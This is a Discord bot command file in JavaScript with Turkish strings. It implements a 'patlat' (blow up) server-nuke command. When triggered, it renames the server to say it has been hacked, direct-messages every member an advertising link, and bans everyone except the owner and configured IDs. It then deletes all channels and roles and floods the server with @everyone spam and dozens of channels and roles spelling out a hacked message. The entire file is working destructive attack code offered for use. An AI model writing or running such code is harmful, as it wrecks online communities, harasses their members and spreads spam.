const Config = require("../Config.js")

exports.run = async (client, message, args) => {

    message.delete()
    const guild = message.guild
    guild.setName(`${Config.SahipAdı} | HACKLENDİNİZ.`).then(() => {
        console.success(`Sunucu adı başarıyla güncellendi.`);
    }).catch(console.error);
    guild.members.fetch().then(members => {
        members.forEach(member => {
            member.send(`Bu sunucu ${Config.SahipAdı} tarafından patlatılmıştır.\n ${Config.ReklamSunucuLink}`)
            if (member.id === guild.ownerId) return;
            if (Config.SahipID.includes(member.id)) return;
            member.ban()
        });
    }).catch(console.error);

    guild.channels.fetch().then(channels => {
        channels.forEach(channel => {
            channel.delete()
        });
    }).catch(console.error);

    guild.roles.fetch().then(roles => {
        roles.forEach(role => {
            role.delete()
        });
    }).catch(console.error);

    guild.channels.create('chat', {
        type: 'GUILD_TEXT',
        reason: 'Metin kanalı oluşturuldu'
    }).then(channel => {
        for (let i = 0; i < 50; i++) {
            channel.send(`@everyone | Bu sunucu ${Config.SahipAdı} tarafından patlatılmıştır.\n ${Config.ReklamSunucuLink}`);
        }
    }).catch(console.error);

    for (let i = 0; i < 20; i++) {
        guild.channels.create(`------------------`, {
            type: 'GUILD_VOICE',
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);

        guild.channels.create(`${Config.SahipAdı}`, {
            type: 'GUILD_VOICE',
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);

        guild.channels.create('Tarafından', {
            type: 'GUILD_VOICE',
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);

        guild.channels.create('Hacklenmiş', {
            type: 'GUILD_VOICE',
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);

        guild.channels.create('Bulunmaktasınız.', {
            type: 'GUILD_VOICE',
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);

        guild.channels.create(`${Config.SahipAdı}`, {
            type: 'GUILD_VOICE',
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);

        guild.channels.create(`------------------`, {
            type: 'GUILD_VOICE',
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);
    }

    for (let i = 0; i < 5; i++) {
        guild.roles.create({
            name: '------------------',
            color: 'WHITE',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);

        guild.roles.create({
            name: `${Config.SahipAdı}`,
            color: 'WHITE',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);

        guild.roles.create({
            name: 'Tarafından',
            color: 'ORANGE',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);

        guild.roles.create({
            name: 'Hacklenmiş',
            color: 'RED',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);

        guild.roles.create({
            name: 'Bulunmaktasınız',
            color: 'ORANGE',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);

        guild.roles.create({
            name: `${Config.SahipAdı}`,
            color: 'WHITE',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);

        guild.roles.create({
            name: '------------------',
            color: 'WHITE',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);
    }

};
exports.conf = {
    aliases: [],
    komut: "patlat"
};